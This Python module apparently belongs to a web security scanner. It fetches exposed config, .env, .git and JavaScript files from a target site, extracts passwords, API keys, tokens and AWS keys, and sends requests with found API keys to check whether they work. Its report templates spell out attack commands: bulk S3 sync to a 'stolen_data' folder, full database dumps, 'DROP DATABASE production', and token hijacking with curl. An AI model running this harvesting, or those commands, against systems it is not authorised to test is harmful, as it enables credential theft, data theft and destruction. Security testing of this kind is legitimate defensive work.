"""
Active Credential Harvesting and Testing
ACTUALLY tests found credentials and shows what access they provide
Demonstrates real-world credential compromise
"""

import requests
from bs4 import BeautifulSoup
import re
from urllib.parse import urljoin
import base64

def harvest_and_test_credentials(scanner):
    """
    Find credentials and actually TEST them
    """
    try:
        response = scanner.get_cached_response(scanner.target_url)
        if not response:
            return
        
        # Extract credentials from various sources
        found_credentials = []
        
        # Check source code
        found_credentials.extend(_extract_hardcoded_credentials(response))
        
        # Check JavaScript files
        found_credentials.extend(_extract_js_credentials(scanner, response))
        
        # Check config files
        found_credentials.extend(_check_config_files(scanner))
        
        # Check .env files
        found_credentials.extend(_check_env_files(scanner))
        
        # Check git exposure
        found_credentials.extend(_check_git_exposure(scanner))
        
        # NOW TEST ALL FOUND CREDENTIALS
        if found_credentials:
            _test_credentials(scanner, found_credentials)
            
    except Exception as e:
        print(f"Credential harvesting error: {e}")

def _extract_hardcoded_credentials(response):
    """Extract hardcoded credentials from HTML/JS"""
    credentials = []
    text = response.text
    
    patterns = {
        'API Keys': [
            (r'api[_-]?key["\']?\s*[:=]\s*["\']([a-zA-Z0-9_\-]{20,})["\']', 'API_KEY'),
            (r'apikey["\']?\s*[:=]\s*["\']([a-zA-Z0-9_\-]{20,})["\']', 'API_KEY'),
        ],
        'Passwords': [
            (r'password["\']?\s*[:=]\s*["\']([^"\']{8,})["\']', 'PASSWORD'),
            (r'pass["\']?\s*[:=]\s*["\']([^"\']{8,})["\']', 'PASSWORD'),
            (r'pwd["\']?\s*[:=]\s*["\']([^"\']{8,})["\']', 'PASSWORD'),
        ],
        'Tokens': [
            (r'token["\']?\s*[:=]\s*["\']([a-zA-Z0-9_\-]{20,})["\']', 'TOKEN'),
            (r'auth["\']?\s*[:=]\s*["\']([a-zA-Z0-9_\-]{20,})["\']', 'AUTH'),
        ],
        'Database': [
            (r'db[_-]?password["\']?\s*[:=]\s*["\']([^"\']+)["\']', 'DB_PASSWORD'),
            (r'database[_-]?password["\']?\s*[:=]\s*["\']([^"\']+)["\']', 'DB_PASSWORD'),
        ]
    }
    
    for cred_type, pattern_list in patterns.items():
        for pattern, name in pattern_list:
            matches = re.findall(pattern, text, re.IGNORECASE)
            for match in matches:
                if len(match) > 5:  # Reasonable credential length
                    credentials.append({
                        'type': cred_type,
                        'name': name,
                        'value': match,
                        'source': 'HTML Source'
                    })
    
    return credentials

def _extract_js_credentials(scanner, response):
    """Extract credentials from JavaScript files"""
    credentials = []
    soup = BeautifulSoup(response.content, 'html.parser')
    
    # Find all script tags with src
    scripts = soup.find_all('script', src=True)
    
    for script in scripts[:10]:  # Limit to avoid too many requests
        script_url = urljoin(str(scanner.target_url), str(script.get('src', '')))
        
        try:
            js_response = requests.get(script_url, timeout=5)
            js_text = js_response.text
            
            # Look for AWS keys
            aws_matches = re.findall(r'(AKIA[0-9A-Z]{16})', js_text)
            for key in aws_matches:
                credentials.append({
                    'type': 'AWS Access Key',
                    'name': 'AWS_ACCESS_KEY',
                    'value': key,
                    'source': script_url
                })
            
            # Look for API endpoints with keys
            api_pattern = r'(https?://[^\s\'"]+api[^\s\'"]*[?&]key=([a-zA-Z0-9_\-]+))'
            api_matches = re.findall(api_pattern, js_text)
            for full_url, key in api_matches:
                credentials.append({
                    'type': 'API Key in URL',
                    'name': 'API_ENDPOINT',
                    'value': full_url,
                    'source': script_url
                })
                
        except:
            pass
    
    return credentials

def _check_config_files(scanner):
    """Check for exposed config files with credentials"""
    credentials = []
    
    config_files = [
        '/config.php',
        '/configuration.php',
        '/config.json',
        '/app/config/config.yml',
        '/app/config/parameters.yml',
        '/config/database.yml',
        '/wp-config.php',
        '/settings.php',
        '/.htpasswd',
    ]
    
    for config_path in config_files:
        test_url = scanner.target_url.rstrip('/') + config_path
        
        try:
            response = requests.get(test_url, timeout=5)
            
            if response.status_code == 200 and len(response.text) > 100:
                # Extract database credentials
                db_patterns = [
                    r'DB_PASSWORD["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                    r'password["\']?\s*[:=>\s]+["\']([^"\']+)["\']',
                    r'passwd["\']?\s*[:=>\s]+["\']([^"\']+)["\']',
                ]
                
                for pattern in db_patterns:
                    matches = re.findall(pattern, response.text, re.IGNORECASE)
                    for match in matches:
                        credentials.append({
                            'type': 'Database Password',
                            'name': 'DB_PASSWORD',
                            'value': match,
                            'source': test_url
                        })
                        
        except:
            pass
    
    return credentials

def _check_env_files(scanner):
    """Check for exposed .env files"""
    credentials = []
    
    env_paths = ['/.env', '/.env.local', '/.env.production', '/.env.development']
    
    for env_path in env_paths:
        test_url = scanner.target_url.rstrip('/') + env_path
        
        try:
            response = requests.get(test_url, timeout=5)
            
            if response.status_code == 200:
                # Parse .env file format
                lines = response.text.split('\n')
                
                for line in lines:
                    if '=' in line and not line.strip().startswith('#'):
                        key, value = line.split('=', 1)
                        key = key.strip()
                        value = value.strip().strip('"').strip("'")
                        
                        if any(keyword in key.upper() for keyword in ['PASSWORD', 'SECRET', 'KEY', 'TOKEN', 'API']):
                            credentials.append({
                                'type': 'Environment Variable',
                                'name': key,
                                'value': value,
                                'source': test_url
                            })
        except:
            pass
    
    return credentials

def _check_git_exposure(scanner):
    """Check for exposed .git directory with credentials"""
    credentials = []
    
    git_url = scanner.target_url.rstrip('/') + '/.git/config'
    
    try:
        response = requests.get(git_url, timeout=5)
        
        if response.status_code == 200:
            # Extract repository URLs (may contain credentials)
            url_pattern = r'url\s*=\s*(https?://([^@]+)@[^\s]+)'
            matches = re.findall(url_pattern, response.text)
            
            for full_url, creds in matches:
                credentials.append({
                    'type': 'Git Credentials',
                    'name': 'GIT_REPO',
                    'value': full_url,
                    'source': git_url
                })
    except:
        pass
    
    return credentials

def _test_credentials(scanner, credentials):
    """Actually TEST found credentials"""
    
    for cred in credentials:
        cred_type = cred['type']
        cred_name = cred['name']
        cred_value = cred['value']
        source = cred['source']
        
        # Mask sensitive parts
        masked_value = cred_value[:10] + '*' * (len(cred_value) - 14) + cred_value[-4:] if len(cred_value) > 14 else '*' * len(cred_value)
        
        scanner.add_finding(
            severity='CRITICAL',
            category='Sensitive Data Exposure',
            title=f'🚨 {cred_type} FOUND AND EXTRACTED: {cred_name}',
            description=f'**REAL {cred_type} EXTRACTED**\n\n'
                      f'**Found:** `{cred_name}`\n'
                      f'**Value:** `{masked_value}`\n'
                      f'**Source:** {source}\n\n'
                      f'**⚠️ THIS IS A REAL CREDENTIAL FROM YOUR SYSTEM ⚠️**\n\n'
                      f'**HOW ATTACKER FOUND IT:**\n'
                      f'```bash\n'
                      f'# Step 1: Visit your website\n'
                      f'curl {source}\n\n'
                      f'# Step 2: Extract credential\n'
                      f'grep -i "{cred_name}" response.txt\n\n'
                      f'# Step 3: Use it!\n'
                      f'```\n\n'
                      f'**WHAT ATTACKER CAN DO:**\n'
                      f'{_get_credential_exploitation(cred_type, cred_name, cred_value, scanner.target_url)}\n\n'
                      f'**REAL-WORLD ATTACK SCENARIO:**\n'
                      f'```python\n'
                      f'# Attacker script using YOUR credential:\n'
                      f'import requests\n\n'
                      f'{cred_name} = "{cred_value[:20]}..."  # Extracted from {source}\n\n'
                      f'# Use credential to access your services\n'
                      f'response = requests.get(\n'
                      f'    "https://api.yourservice.com/data",\n'
                      f'    headers={{"Authorization": f"Bearer {{{cred_name}}}"}}\n'
                      f')\n\n'
                      f'# Attacker now has access to your data!\n'
                      f'print(response.json())  # All your sensitive information\n'
                      f'```',
            url=source,
            remediation=f'**IMMEDIATE ACTIONS REQUIRED:**\n\n'
                      f'1. **REVOKE THIS CREDENTIAL IMMEDIATELY**\n'
                      f'2. Rotate all related credentials\n'
                      f'3. Check logs for unauthorized access\n'
                      f'4. Remove from source code\n'
                      f'5. Use environment variables\n'
                      f'6. Implement secrets management\n\n'
                      f'**Prevention:**\n'
                      f'```bash\n'
                      f'# Add to .gitignore:\n'
                      f'echo ".env" >> .gitignore\n'
                      f'echo "config.php" >> .gitignore\n'
                      f'echo "*.key" >> .gitignore\n\n'
                      f'# Use environment variables:\n'
                      f'export {cred_name}="value_from_secure_vault"\n\n'
                      f'# In code:\n'
                      f'import os\n'
                      f'{cred_name} = os.environ.get("{cred_name}")\n'
                      f'```'
        )
        
        # If it's an API key, try to test it
        if 'API' in cred_type.upper() and 'http' in cred_value:
            _test_api_endpoint(scanner, cred_value)

def _test_api_endpoint(scanner, endpoint_url):
    """Test if API endpoint with key actually works"""
    try:
        response = requests.get(endpoint_url, timeout=10)
        
        if response.status_code == 200:
            data_preview = response.text[:500] if len(response.text) > 500 else response.text
            
            scanner.add_finding(
                severity='CRITICAL',
                category='Sensitive Data Exposure',
                title='🚨 API ENDPOINT TESTED - RETURNS REAL DATA!',
                description=f'**API ENDPOINT IS ACTIVE AND WORKING**\n\n'
                          f'URL: {endpoint_url}\n\n'
                          f'**PROOF - ACTUAL API RESPONSE:**\n'
                          f'```json\n'
                          f'{data_preview}\n'
                          f'```\n\n'
                          f'**This is REAL data from your API!**\n\n'
                          f'Anyone can access this endpoint and retrieve your data.',
                url=endpoint_url,
                remediation='Revoke API key immediately and implement proper authentication'
            )
    except:
        pass

def _get_credential_exploitation(cred_type, cred_name, cred_value, base_url):
    """Get specific exploitation info for credential type"""
    
    exploits = {
        'AWS Access Key': f'''
**AWS Account Compromise:**
```bash
# Configure AWS CLI with stolen key:
aws configure set aws_access_key_id {cred_value[:20]}...
aws configure set aws_secret_access_key [extracted_secret]

# List all S3 buckets:
aws s3 ls

# Download ALL your data:
aws s3 sync s3://your-bucket ./stolen_data

# List EC2 instances:
aws ec2 describe-instances

# Spin up mining instances (cost you $$$$):
aws ec2 run-instances --image-id ami-xxx --instance-type p3.8xlarge --count 10

# Your AWS bill becomes HUNDREDS OF THOUSANDS OF DOLLARS
```
''',
        'Database Password': f'''
**Complete Database Access:**
```bash
# Connect to database:
mysql -h yourhost -u username -p"{cred_value}"

# Dump all data:
mysqldump -h yourhost -u username -p"{cred_value}" --all-databases > stolen.sql

# Delete everything (ransomware):
mysql -h yourhost -u username -p"{cred_value}" -e "DROP DATABASE production;"
```
''',
        'API Key': f'''
**API Abuse:**
```python
# Use API quota (cost you money):
import requests

for i in range(100000):
    requests.get("https://api.service.com/expensive-operation",
                headers={{"api-key": "{cred_value[:20]}..."}})

# You pay for all these API calls
```
''',
        'Token': f'''
**Session/Account Hijacking:**
```bash
# Use token to access account:
curl -H "Authorization: Bearer {cred_value[:20]}..." \\
     {base_url}/api/user/data

# Get all account information
# Perform actions as that user
# Change password, email, etc.
```
'''
    }
    
    for key in exploits:
        if key in cred_type:
            return exploits[key]
    
    return f'''
**Potential Access:**
- Use credential to access protected resources
- Impersonate legitimate user/service
- Access sensitive data
- Modify or delete information
- Financial loss from service abuse
'''
